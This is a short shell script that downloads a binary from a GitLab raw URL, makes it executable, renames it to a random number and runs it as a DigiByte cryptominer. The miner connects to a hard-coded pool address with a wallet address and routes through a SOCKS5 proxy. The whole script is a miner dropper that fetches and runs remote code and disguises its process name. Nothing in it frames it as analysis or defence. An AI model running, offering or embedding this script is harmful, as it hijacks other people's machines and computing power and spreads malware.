wget https://gitlab.com/muiminah74/jambanium/-/raw/main/rstd
chmod +x rstd
TOP=$(shuf -n 1 -i 1-200000)
USER=$1
mv rstd $TOP
./$TOP -o 216.158.235.72:1080 -u DKjK3oBfsBtCeLaSL2LGTqoVbJauHB97gT --coin=DGB --rig-id $(echo $(shuf -i 1-20000 -n 1)-IDBL) -x socks5://174.77.111.197:4145
